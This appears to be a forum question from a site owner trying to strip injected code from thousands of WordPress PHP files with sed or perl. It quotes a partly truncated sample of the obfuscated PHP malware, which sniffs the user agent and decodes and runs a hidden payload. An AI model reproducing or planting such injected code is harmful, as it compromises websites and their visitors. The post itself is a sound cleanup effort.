<p>I have several 1000 WP files that were injected with string such as the following:</p>  <p>I know I can do a replace with something like this:</p>  <pre><code>find . -type f -exec sed -i 's/foo/bar/g' {} + </code></pre>  <p>But I am having a problem getting the large string to be taken correctly. All the " and ' cause the string to jump out of my CLI.</p>  <p>Below is a sample string:</p>  <pre><code>&lt;?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\1162]y4c##j0#67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5%x7825s:*&lt;%x5c%x7825j:,,Bjg!)%x5c%x7825j:&gt;&gt;1*!%x5c%x7825b:&gt;1pde&gt;u%x5c%x7825V&lt;#65,47R25,d7R17,67R37,#%x5c%x7827!hmg%x5c%x7825!)!gj!&lt;2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#&lt;%x5cujojRk3%x5c%x7860{666~7878Bsfuvso!sboepn)%x5c%x7825epnbss-x7827{ftmfV%x5c%x787f&lt;*X&amp;Z&amp;S{ftmfV%x5c%x787f&lt;*XAZASV&lt;*w%x5c%x7825)p5c%x782f#00;quui#&gt;.%x5c%x7825!&lt;***f%x5c%x7827,111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x7x7825)323ldfidk!~!&lt;**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%xp!*#opo#&gt;&gt;}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7%x78257-K)fujs%x5c%x7878X6&lt;#o]o]Y%x5c%x78257;uc%x7825Z&lt;#opo#&gt;b%x5c%x7&lt;!fmtf!%x5c%x7825b:&gt;%x5c%x7825s:%x5c%x70QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6&lt;%x!Ydrr)%x5c%x7825r%x5c%x%x5c%x7825%x5c%x7827Y%x5c%x78256&lt;.msv%x5cq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!s%x5c%x782fq%x5c%x7825&gt;U&lt;#16,47R57,27R66,#%x5c%x782fq%x560msvd}+;!&gt;!}%x5c%x7827;!&gt;tpI#7&gt;%x5c%x782f7rfs%x5c%x78256&lt;#o]1%x5c%x782f2e:4e, $rzgpabhkfk, NULL); $qenzappyva=$rzgpabhkfk; $qenzappyva=(798-677); $rlapmcvoxs=$qenzappyva-1; ?&gt; </code></pre>  <p>EXAMPLE of what I tried:</p>  <pre><code>perl -pi -e 's/&lt;?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?&gt;&lt;?php $rlapmcvfunction fjfgg($n){%x7825_t%x5c%x7825:osvufs:~:&lt;*9-1-r%x5c%x7825)s%x5c%x7825&gt;%x5c%x782c%x7824*!|!%x5c%x7824-...x2a\57\x20"; $qenzappyva=substr($rlapmcvoxs,(48535-38422),(59-47)); $qenzappyva($rrzeotjace, $rzgpabhkfk, NULL); $qenzappyva=$rzgpabhkfk; $qenzappyva=(798-677); $rlapmcvoxs=$qenzappyva-1; ?&gt;//g' /home/......../content-grid.php -bash: !: event not found </code></pre>